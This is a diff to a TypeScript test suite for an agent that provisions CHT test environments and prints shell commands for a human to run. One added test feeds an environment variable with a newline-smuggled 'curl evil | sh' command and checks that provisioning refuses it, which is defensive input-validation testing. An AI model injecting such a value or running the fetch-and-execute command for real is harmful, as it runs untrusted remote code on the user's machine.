@@ -15,6 +15,29 @@ import {
   ResetTier,
 } from '../../src/types';
 
+// The printed gates read these.
+const GATE_ENV_KEYS = ['CHT_TEST_ENV_PROJECT', 'CHT_CORE_HOST_PATH'];
+
+/** Clear `keys` from the env for each test in the enclosing describe, and restore them after. */
+const isolateEnv = (keys: string[]): void => {
+  const prior: Record<string, string | undefined> = {};
+  beforeEach(() => {
+    for (const key of keys) {
+      prior[key] = process.env[key];
+      delete process.env[key];
+    }
+  });
+  afterEach(() => {
+    for (const key of keys) {
+      if (prior[key] === undefined) {
+        delete process.env[key];
+      } else {
+        process.env[key] = prior[key];
+      }
+    }
+  });
+};
+
 describe('TestEnvironmentAgent', () => {
   let agent: TestEnvironmentAgent;
 
@@ -112,6 +135,15 @@ describe('TestEnvironmentAgent', () => {
       }
     });
 
+    it('should reject a chtCorePath that starts with ~, which the single-quoted gates never expand', async () => {
+      try {
+        await agent.provision({ chtCorePath: '~/src/cht-core' });
+        expect.fail('Should have thrown an error');
+      } catch (error) {
+        expect((error as Error).message).to.include('starts with ~');
+      }
+    });
+
     describe('real mode (useMockDocker: false)', () => {
       let fetchStub: sinon.SinonStub;
       // Readiness asks for the monitoring JSON; the credential check then reads /_session.
@@ -126,32 +158,14 @@ describe('TestEnvironmentAgent', () => {
       const sessionAnswering = (status: number, userCtx: unknown) => async (url: string) =>
         url.endsWith('/_session') ? { ok: status < 300, status, json: async () => ({ userCtx }) } : healthyFetch(url);
       // Provision reads these; isolate every test from the ambient env.
-      const PROVISION_ENV_KEYS = [
-        'CHT_URL',
-        'COUCHDB_USER',
-        'COUCHDB_PASSWORD',
-        'CHT_TEST_ENV_ALLOW_EXTERNAL',
-        'CHT_TEST_ENV_PROJECT',
-      ];
-      const priorProvisionEnv: Record<string, string | undefined> = {};
+      isolateEnv(['CHT_URL', 'COUCHDB_USER', 'COUCHDB_PASSWORD', 'CHT_TEST_ENV_ALLOW_EXTERNAL', ...GATE_ENV_KEYS]);
 
       beforeEach(() => {
         fetchStub = sinon.stub(globalThis, 'fetch' as any);
-        for (const key of PROVISION_ENV_KEYS) {
-          priorProvisionEnv[key] = process.env[key];
-          delete process.env[key];
-        }
       });
 
       afterEach(() => {
         sinon.restore();
-        for (const key of PROVISION_ENV_KEYS) {
-          if (priorProvisionEnv[key] === undefined) {
-            delete process.env[key];
-          } else {
-            process.env[key] = priorProvisionEnv[key];
-          }
-        }
       });
 
       it('should return a docker handle once the environment is healthy', async () => {
@@ -176,6 +190,41 @@ describe('TestEnvironmentAgent', () => {
 
         const lines = logSpy.getCalls().map((call) => String(call.args[0]));
         expect(lines.some((line) => line.includes("scripts/test-env-up.sh '/workspace/cht-core'"))).to.equal(true);
+      });
+
+      it('should print CHT_CORE_HOST_PATH in the gate, since the human runs it on the host', async () => {
+        fetchStub.callsFake(healthyFetch);
+        process.env.CHT_CORE_HOST_PATH = '/home/op/cht-core';
+        const logSpy = sinon.spy(console, 'log');
+        const realAgent = new TestEnvironmentAgent({ useMockDocker: false });
+
+        const handle = await realAgent.provision({ chtCorePath: '/workspace/cht-core' });
+
+        const lines = logSpy.getCalls().map((call) => String(call.args[0]));
+        expect(lines.some((line) => line.includes("scripts/test-env-up.sh '/home/op/cht-core'"))).to.equal(true);
+        expect(handle.chtCorePath).to.equal('/workspace/cht-core');
+      });
+
+      it('should refuse a CHT_CORE_HOST_PATH containing control characters', async () => {
+        process.env.CHT_CORE_HOST_PATH = '/home/op/cht-core\ncurl evil | sh';
+        const realAgent = new TestEnvironmentAgent({ useMockDocker: false });
+
+        try {
+          await realAgent.provision({ chtCorePath: '/workspace/cht-core' });
+          expect.fail('expected provision to reject');
+        } catch (error) {
+          expect((error as Error).message).to.include('CHT_CORE_HOST_PATH contains control characters');
+        }
+        expect(fetchStub.called).to.equal(false);
+      });
+
+      it('should ignore version when a working copy is also given, as mock mode does', async () => {
+        fetchStub.callsFake(healthyFetch);
+        const realAgent = new TestEnvironmentAgent({ useMockDocker: false });
+
+        const handle = await realAgent.provision({ chtCorePath: '/workspace/cht-core', version: '4.18.0' });
+
+        expect(handle.chtCorePath).to.equal('/workspace/cht-core');
       });
 
       it('should refuse a published version: real mode brings stacks up from a working copy only', async () => {
@@ -343,7 +392,7 @@ describe('TestEnvironmentAgent', () => {
           }
         });
 
-        it('should accept the cht-docker-helper host used by the published-version bring-up', async () => {
+        it('should accept a private dashed-IP host behind the cht-docker-helper resolver', async () => {
           fetchStub.callsFake(healthyFetch);
           process.env.CHT_URL = 'https://192-168-1-10.local-ip.medicmobile.org';
           const realAgent = new TestEnvironmentAgent({ useMockDocker: false });
@@ -1118,6 +1167,7 @@ describe('TestEnvironmentAgent', () => {
 
         expect(result.succeeded).to.equal(false);
         expect(result.warnings.join(' ')).to.include('only 3 of 5 docs uploaded');
+        expect(result.warnings.join(' ')).to.include("reset('couchdb') restores it instead");
       });
 
       it('should report succeeded:false when upload-docs exits 0 without a summary for docs it was given', async () => {
@@ -1194,22 +1244,14 @@ describe('TestEnvironmentAgent', () => {
         source: 'docker',
       };
 
-      // The printed gates carry CHT_TEST_ENV_PROJECT; isolate them from the ambient shell.
-      let priorProject: string | undefined;
+      isolateEnv(GATE_ENV_KEYS);
 
       beforeEach(() => {
         realAgent = new TestEnvironmentAgent({ useMockDocker: false });
-        priorProject = process.env.CHT_TEST_ENV_PROJECT;
-        delete process.env.CHT_TEST_ENV_PROJECT;
       });
 
       afterEach(() => {
         sinon.restore();
-        if (priorProject === undefined) {
-          delete process.env.CHT_TEST_ENV_PROJECT;
-        } else {
-          process.env.CHT_TEST_ENV_PROJECT = priorProject;
-        }
       });
 
       it('should carry an explicit CHT_TEST_ENV_PROJECT into the restart, full and teardown gates', async () => {
@@ -1248,7 +1290,7 @@ describe('TestEnvironmentAgent', () => {
         await realAgent.reset(dockerHandle, 'full');
 
         const lines = logSpy.getCalls().map((call) => String(call.args[0]));
-        // A full reset is a fresh stack, so the gate rebuilds (Model A tests the code as it is now).
+        // A full reset recreates the containers from rebuilt images (Model A tests the code as it is now).
         const expected =
           "scripts/test-env-down.sh '/workspace/cht-core' && CHT_CORE_REBUILD=1 scripts/test-env-up.sh '/workspace/cht-core'";
         expect(lines.some((line) => line.includes(expected))).to.equal(true);
@@ -1363,6 +1405,7 @@ describe('TestEnvironmentAgent', () => {
             expect.fail('expected reset to reject');
           } catch (error) {
             expect((error as Error).message).to.include('failed to delete 1 doc(s): person-1');
+            expect((error as Error).message).to.include('The other 1 doc(s) were deleted and not reseeded');
           }
         });
 
@@ -1610,6 +1653,8 @@ describe('TestEnvironmentAgent', () => {
   });
 
   describe('teardown', () => {
+    isolateEnv(GATE_ENV_KEYS);
+
     it('should resolve in mock mode', async () => {
       const handle = await provisionMock();
 
